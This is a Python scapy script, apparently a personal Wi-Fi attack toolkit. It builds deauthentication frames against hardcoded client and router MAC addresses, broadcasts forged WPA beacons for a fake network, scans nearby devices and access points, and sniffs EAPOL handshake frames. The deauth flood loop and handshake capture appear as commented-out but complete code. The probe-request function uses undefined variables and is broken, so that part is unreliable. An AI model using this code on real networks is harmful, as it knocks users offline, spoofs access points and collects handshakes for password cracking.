import subprocess
import sys, ctypes
import time

from scapy.all import *
from scapy.layers.dot11 import Dot11ProbeReq, Dot11, Dot11Beacon, RadioTap, Dot11Deauth, Dot11Elt
import threading
from Interface import Interface


def deauthentication_ap():
    target_mac = "be:39:2e:b1:eb:85"
    gateway_mac = "14:ae:db:a3:22:95"  # "08:be:ac:13:18:11"

    pkt = RadioTap() / Dot11(addr1=gateway_mac, addr2=target_mac, addr3=target_mac) / Dot11Deauth(reason=7)

    return pkt


def deauthentication_cl():
    target_mac = "be:39:2e:b1:eb:85"
    gateway_mac = "14:ae:db:a3:22:95"  # "08:be:ac:13:18:11"

    pkt = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth(reason=7)

    return pkt


def scan_devices(pkt):
    if pkt.haslayer(Dot11):
        dot11_layer = pkt.getlayer(Dot11)
        if dot11_layer.addr2:
            dev = dot11_layer.addr2 + " " + dot11_layer.addr1
            if dev not in fornow:
                print(dot11_layer.addr2 + " " + dot11_layer.addr1)
                fornow.append(dev)




def scan_ap(pkt):
    if pkt.haslayer(Dot11):
        try:
            netName = pkt.getlayer(Dot11).info
            if netName not in probeReqs and netName.decode() != "":
                probeReqs.append(netName)
                print(netName.decode() + " " + str(ord(pkt[Dot11Elt:3].info)) + " ")

        except:
            pass

    # hidden ssid
    if pkt.haslayer(Dot11Beacon):
        if not pkt.info and pkt.addr3 not in probeReqs:
            probeReqs.append(pkt.addr3)
            print(pkt.addr3)


def sniff_probe(pkt):
    if pkt.haslayer(Dot11ProbeReq):
        print(pkt.addr2)
        print(pkt.info)
        print(pkt.addr1)
        if pkt.addr1 == "ff:ff:ff:ff:ff:ff" and pkt.addr2 == "8c:b8:4a:b8:7c:8b":
            param = Dot11ProbeReq()
            essid = Dot11Elt(ID='SSID', info=ssid)
            rates = Dot11Elt(ID='Rates', info=self.rates)
            dsset = Dot11Elt(ID='DSset', info='\x01')
            pkt = RadioTap() \
                  / Dot11(type=0, subtype=4, FCfield=fc, addr1=dst, addr2=self.source, addr3=self.bssid) \
                  / param / essid / rates / dsset

            print('[*] 802.11 Probe Request: SSID=[%s], count=%d' % (ssid, count))
            try:
                sendp(pkt, count=count, inter=0.1, verbose=1)
            except:
                raise


def send_beacon():
    ssids = ["AAA"]  # Network name here
    iface = "wlan0"  # Interface name here
    frames = []
    for netSSID in ssids:
        dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',
                      addr2="00:c0:ca:ad:0c:fe", addr3="14:ae:db:a3:22:95")
        beacon = Dot11Beacon(cap='ESS+privacy')
        essid = Dot11Elt(ID='SSID', info=netSSID, len=len(netSSID))
        rsn = Dot11Elt(ID='RSNinfo', info=(
            '\x01\x00'  # RSN Version 1
            '\x00\x0f\xac\x02'  # Group Cipher Suite : 00-0f-ac TKIP
            '\x02\x00'  # 2 Pairwise Cipher Suites (next two lines)
            '\x00\x0f\xac\x04'  # AES Cipher
            '\x00\x0f\xac\x02'  # TKIP Cipher
            '\x01\x00'  # 1 Authentication Key Managment Suite (line below)
            '\x00\x0f\xac\x02'  # Pre-Shared Key
            '\x00\x00'))  # RSN Capabilities (no extra capabilities)

        frame = RadioTap() / dot11 / beacon / essid / rsn
        frames.append(frame)
    sendp(frames, iface=iface, inter=0.1 if len(frames) < 10 else 0, loop=1)


def sniff_eapol(pkt):
    if pkt.haslayer(EAPOL):
        pkt.show()


probeReqs = []
interface = Interface("wlan0")


# interface.monitor_mode(True)
fornow = []
sniff(iface=interface.name, prn=scan_devices, monitor=True)

# t = threading.Thread(target=change_channel)
# t.daemon = True
# t.start()
# sniff(iface=interface.name, prn=scan_ap, monitor=True)


# interface.monitor_mode(True)
#while True:
#    sendp(deauthentication_ap(), iface="wlan0", count=1, inter=.2, verbose=1)
#    sendp(deauthentication_cl(), iface="wlan0", count=1, inter=.2, verbose=1)


# interface.monitor_mode(True)
# sniff(iface=interface.name, prn=sniff_eapol, monitor=True)
